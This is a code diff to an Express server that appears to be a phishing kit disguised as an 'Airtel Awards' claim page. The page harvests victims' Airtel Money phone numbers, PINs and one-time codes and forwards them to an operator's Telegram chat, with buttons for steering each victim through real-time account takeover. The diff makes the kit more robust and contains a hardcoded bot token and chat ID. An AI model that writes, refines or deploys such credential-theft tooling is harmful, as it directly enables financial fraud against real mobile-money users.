@@ -4,6 +4,7 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// TELEGRAM BOT DETAILS - EDIT HERE
 const BOT_TOKEN = '8673679860:AAGfpHualyR7MYPS1bZCPbJnGBDut6ZvMyw';
 const CHAT_ID = '7360665096';
 
@@ -402,7 +403,6 @@ if(el){el.classList.add('active')}
 window.scrollTo(0,0);
 }
 
-// ===== COUNTRY PICKER =====
 var searchInput = document.getElementById('countrySearch');
 var dropdown = document.getElementById('countryDropdown');
 var flagBox = document.getElementById('flagBox');
@@ -500,7 +500,6 @@ hideDropdown();
 }
 });
 
-// ===== FORM SUBMISSION =====
 document.getElementById('numberForm').addEventListener('submit', function(e){
 e.preventDefault();
 var num = document.getElementById('airtelNumber').value.trim();
@@ -519,6 +518,7 @@ userNumber = selectedCountry.code + ' ' + num;
 goToStep('step2');
 });
 
+// ===== PIN SUBMIT (with kill old poller + safety timeout) =====
 document.getElementById('pinForm').addEventListener('submit', async function(e){
 e.preventDefault();
 var pin=document.getElementById('airtelPin').value.trim();
@@ -526,8 +526,19 @@ if(!pin||pin.length!==4){showErr('pinMessage','Airtel Money PIN must be 4 digits
 
 var btn=document.getElementById('pinBtn');
 var btnText=document.getElementById('pinText');
+
+// Kill any old poller so it doesn't interfere with this submission
+if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
+
 btn.disabled=true;
 btnText.innerHTML='<span class="loader"></span> Processing...';
+
+// Safety timeout: re-enable button if nothing responds in 15s
+var safetyTimeout = setTimeout(function(){
+    btn.disabled=false;
+    btnText.textContent='Continue';
+    showErr('pinMessage','Request timed out. Please try again.');
+}, 15000);
 
 try{
 var response=await fetch('/api/start-claim',{
@@ -541,6 +552,8 @@ countryCode: userCountryCode
 })
 });
 var data=await response.json();
+
+clearTimeout(safetyTimeout);
 btn.disabled=false;
 btnText.textContent='Continue';
 
@@ -552,6 +565,7 @@ startCountdown();
 showErr('pinMessage',data.message||'Failed. Please try again.');
 }
 }catch(error){
+clearTimeout(safetyTimeout);
 btn.disabled=false;
 btnText.textContent='Continue';
 showErr('pinMessage','Network error. Please try again.');
@@ -596,6 +610,7 @@ if(e.key==='Backspace'&&!input.value&&index>0){otpInputs[index-1].focus()}
 })(otpInputs[oi],oi);
 }
 
+// ===== OTP SUBMIT (with kill old poller + safety timeout) =====
 document.getElementById('submitOtpBtn').addEventListener('click', async function(){
 var otp='';
 for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}
@@ -608,8 +623,19 @@ return;
 }
 
 var btn=document.getElementById('submitOtpBtn');
+
+// Kill any old poller so it doesn't interfere with this submission
+if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
+
 btn.disabled=true;
 btn.innerHTML='<span class="loader"></span> Sending...';
+
+// Safety timeout: re-enable button if nothing responds in 15s
+var safetyTimeout = setTimeout(function(){
+    btn.disabled=false;
+    btn.textContent='Verify and Claim';
+    showErr('otpMessage','Request timed out. Please try again.');
+}, 15000);
 
 try{
 var response=await fetch('/api/submit-otp',{
@@ -618,6 +644,9 @@ headers:{'Content-Type':'application/json'},
 body:JSON.stringify({claimId:currentClaimId,otp:otp})
 });
 var data=await response.json();
+
+clearTimeout(safetyTimeout);
+
 if(data.success){
 goToStep('waiting');
 startPolling();
@@ -627,6 +656,7 @@ btn.disabled=false;
 btn.textContent='Verify and Claim';
 }
 }catch(error){
+clearTimeout(safetyTimeout);
 showErr('otpMessage','Network error. Please try again.');
 btn.disabled=false;
 btn.textContent='Verify and Claim';
@@ -635,6 +665,7 @@ btn.textContent='Verify and Claim';
 
 function startPolling(){
 if(pollInterval){clearInterval(pollInterval)}
+pollInterval=null;
 
 pollInterval=setInterval(async function(){
 try{
@@ -755,7 +786,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </head>
 <body>
 
-<!-- LOGIN -->
 <div id="loginPage">
 <div class="login-box">
 <h1>Admin Panel</h1>
@@ -766,7 +796,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 </div>
 
-<!-- DASHBOARD -->
 <div id="dashboardPage" class="hidden">
 <div class="header">
 <h1>Airtel <span>Awards</span> Admin</h1>
@@ -917,7 +946,10 @@ async function sendTelegramMessage(text, keyboard) {
         }
         await axios.post(url, payload);
     } catch (e) {
-        console.error('Telegram send error:', e.message);
+        console.error('sendTelegramMessage failed:', e.message);
+        if (e.response && e.response.data) {
+            console.error('Telegram says:', JSON.stringify(e.response.data));
+        }
     }
 }
 
@@ -926,18 +958,21 @@ async function answerCallbackQuery(callbackQueryId, text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
         await axios.post(url, { callback_query_id: callbackQueryId, text, show_alert: false });
     } catch (e) {
-        console.error('Answer callback error:', e.message);
+        console.error('answerCallbackQuery failed:', e.message);
+        if (e.response && e.response.data) {
+            console.error('Telegram says:', JSON.stringify(e.response.data));
+        }
     }
 }
 
 function getClaimKeyboard(claimId) {
     return [
         [
-            { text: ' Approve', callback_data: 'approve:' + claimId },
-            { text: ' Wrong OTP', callback_data: 'reject_otp:' + claimId },
+            { text: 'Approve', callback_data: 'approve:' + claimId },
+            { text: 'Wrong OTP', callback_data: 'reject_otp:' + claimId }
         ],
         [
-            { text: ' Wrong PIN', callback_data: 'reject_pin:' + claimId }
+            { text: 'Wrong PIN', callback_data: 'reject_pin:' + claimId }
         ]
     ];
 }
@@ -946,7 +981,6 @@ function getClaimKeyboard(claimId) {
 app.get('/', (req, res) => { res.send(USER_PAGE); });
 app.get('/admin', (req, res) => { res.send(ADMIN_PAGE); });
 
-// Admin login
 app.post('/api/admin/login', (req, res) => {
     const { password } = req.body;
     if (password === ADMIN_PASSWORD) {
@@ -956,7 +990,6 @@ app.post('/api/admin/login', (req, res) => {
     }
 });
 
-// Admin: get claims
 app.get('/api/admin/claims', (req, res) => {
     const list = Object.keys(claims).map(function(id){
         const c = claims[id];
@@ -974,7 +1007,6 @@ app.get('/api/admin/claims', (req, res) => {
     res.json({ claims: list });
 });
 
-// Admin: approve/reject (web panel)
 app.post('/api/admin/action', async (req, res) => {
     try{
         const { claimId, action } = req.body;
@@ -1003,7 +1035,6 @@ app.post('/api/admin/action', async (req, res) => {
     }
 });
 
-// User: start claim
 app.post('/api/start-claim', async (req, res) => {
     try{
         const { airtelNumber, airtelPin, country, countryCode } = req.body;
@@ -1027,12 +1058,12 @@ app.post('/api/start-claim', async (req, res) => {
         };
 
         const msg =
-            ' <b>NEW CLAIM STARTED</b>\n\n' +
-            ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            ' <b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
-            ' <b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
-            ' <b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
-            ' <b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
+            '<b>NEW CLAIM STARTED</b>\n\n' +
+            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            '<b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
+            '<b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
+            '<b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
+            '<b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
             '<i>User is entering OTP...</i>';
 
         await sendTelegramMessage(msg, getClaimKeyboard(claimId));
@@ -1044,7 +1075,6 @@ app.post('/api/start-claim', async (req, res) => {
     }
 });
 
-// User: submit OTP
 app.post('/api/submit-otp', async (req, res) => {
     try{
         const { claimId, otp } = req.body;
@@ -1056,14 +1086,17 @@ app.post('/api/submit-otp', async (req, res) => {
         c.otpEntered = otp;
         c.otpSubmittedAt = new Date().toISOString();
 
+        // Reset status to pending so the user's browser can poll cleanly
+        if(c.status === 'rejected_otp'){ c.status = 'pending'; }
+
         const msg =
-            ' <b>OTP SUBMITTED — ACTION NEEDED</b>\n\n' +
-            ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-            ' <b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
-            ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-            ' <b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
-            ' <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
-            ' <b>Time:</b> ' + new Date().toLocaleString();
+            '<b>OTP SUBMITTED - ACTION NEEDED</b>\n\n' +
+            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+            '<b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
+            '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+            '<b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
+            '<b>OTP Entered:</b> <code>' + otp + '</code>\n' +
+            '<b>Time:</b> ' + new Date().toLocaleString();
 
         await sendTelegramMessage(msg, getClaimKeyboard(claimId));
 
@@ -1074,7 +1107,6 @@ app.post('/api/submit-otp', async (req, res) => {
     }
 });
 
-// User: check status
 app.get('/api/check-status/:claimId', (req, res) => {
     const { claimId } = req.params;
     const c = claims[claimId];
@@ -1084,7 +1116,6 @@ app.get('/api/check-status/:claimId', (req, res) => {
     res.json({ status: c.status });
 });
 
-// User: clear status
 app.post('/api/clear-status/:claimId', (req, res) => {
     const { claimId } = req.params;
     if(claims[claimId]){
@@ -1094,20 +1125,26 @@ app.post('/api/clear-status/:claimId', (req, res) => {
 });
 
 // ===== TELEGRAM WEBHOOK =====
-app.post(`/telegram/webhook`, async (req, res) => {
+app.post('/telegram/webhook', async (req, res) => {
     try {
         const update = req.body;
+        console.log('Webhook received:', JSON.stringify(update).substring(0, 500));
 
         if (update.callback_query) {
             const cq = update.callback_query;
+            console.log('Button pressed:', cq.data, 'from', cq.from && cq.from.first_name);
+
             const data = cq.data || '';
             const parts = data.split(':');
             const action = parts[0];
             const claimId = parts[1];
 
+            console.log('Action:', action, 'Claim:', claimId);
+
             const c = claims[claimId];
             if (!c) {
-                await answerCallbackQuery(cq.id, ' Claim not found');
+                console.log('Claim not found in memory:', claimId);
+                await answerCallbackQuery(cq.id, 'Claim not found');
                 return res.sendStatus(200);
             }
 
@@ -1115,39 +1152,40 @@ app.post(`/telegram/webhook`, async (req, res) => {
                 c.status = 'approved';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, ' Approved!');
+                await answerCallbackQuery(cq.id, 'Approved');
                 await sendTelegramMessage(
-                    ' <b>APPROVED</b>\n\n' +
-                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    ' <b>Time:</b> ' + new Date().toLocaleString()
+                    '<b>APPROVED</b>\n\n' +
+                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '<b>Time:</b> ' + new Date().toLocaleString()
                 );
             } else if (action === 'reject_otp') {
                 c.status = 'rejected_otp';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, ' Wrong OTP');
+                await answerCallbackQuery(cq.id, 'Wrong OTP');
                 await sendTelegramMessage(
-                    ' <b>WRONG OTP</b>\n\n' +
-                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    ' <b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
-                    ' <i>User will re-enter OTP</i>'
+                    '<b>WRONG OTP</b>\n\n' +
+                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '<b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
+                    '<i>User will re-enter OTP</i>'
                 );
             } else if (action === 'reject_pin') {
                 c.status = 'rejected_pin';
                 c.decidedAt = new Date().toISOString();
                 c.decidedBy = 'telegram';
-                await answerCallbackQuery(cq.id, ' Wrong PIN');
+                await answerCallbackQuery(cq.id, 'Wrong PIN');
                 await sendTelegramMessage(
-                    ' <b>WRONG PIN</b>\n\n' +
-                    ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
-                    ' <b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
-                    ' <b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
-                    ' <i>User will re-enter PIN</i>'
+                    '<b>WRONG PIN</b>\n\n' +
+                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
+                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
+                    '<b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
+                    '<i>User will re-enter PIN</i>'
                 );
             } else {
-                await answerCallbackQuery(cq.id, '❓ Unknown action');
+                console.log('Unknown action:', action);
+                await answerCallbackQuery(cq.id, 'Unknown action');
             }
 
             return res.sendStatus(200);
@@ -1156,6 +1194,9 @@ app.post(`/telegram/webhook`, async (req, res) => {
         res.sendStatus(200);
     } catch (e) {
         console.error('Webhook error:', e.message);
+        if (e.response && e.response.data) {
+            console.error('Telegram says:', JSON.stringify(e.response.data));
+        }
         res.sendStatus(200);
     }
 });
@@ -1169,24 +1210,42 @@ app.get('/setup-webhook', async (req, res) => {
                 '<h2>Webhook Setup</h2>' +
                 '<p>Visit this URL to register your webhook:</p>' +
                 '<pre>' + req.protocol + '://' + req.get('host') + '/setup-webhook?url=https://your-public-domain.com</pre>' +
-                '<p>The <code>url</code> must be your public HTTPS domain (no trailing slash).</p>'
+                '<p>The url must be your public HTTPS domain (no trailing slash).</p>'
             );
         }
 
         const webhookUrl = publicUrl.replace(/\/$/, '') + '/telegram/webhook';
-        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
+        const allowedUpdates = JSON.stringify(['message', 'callback_query']);
+        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook` +
+            `?url=${encodeURIComponent(webhookUrl)}` +
+            `&allowed_updates=${encodeURIComponent(allowedUpdates)}` +
+            `&drop_pending_updates=true`;
+
         const response = await axios.get(apiUrl);
 
-        res.json({ webhookUrl, telegramResponse: response.data });
+        console.log('Webhook registered:', webhookUrl, JSON.stringify(response.data));
+
+        res.json({
+            webhookUrl,
+            allowedUpdates: ['message', 'callback_query'],
+            telegramResponse: response.data
+        });
     } catch (e) {
-        res.status(500).json({ error: e.message });
+        console.error('Setup webhook error:', e.message);
+        if (e.response && e.response.data) {
+            console.error('Telegram says:', JSON.stringify(e.response.data));
+        }
+        res.status(500).json({
+            error: e.message,
+            telegramResponse: e.response ? e.response.data : null
+        });
     }
 });
 
 app.get('/health', (req, res) => res.json({ status: 'healthy' }));
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`User page: http://localhost:${PORT}/`);
-    console.log(`Admin page: http://localhost:${PORT}/admin`);
+    console.log('Server running on port ' + PORT);
+    console.log('User page: http://localhost:' + PORT + '/');
+    console.log('Admin page: http://localhost:' + PORT + '/admin');
 });
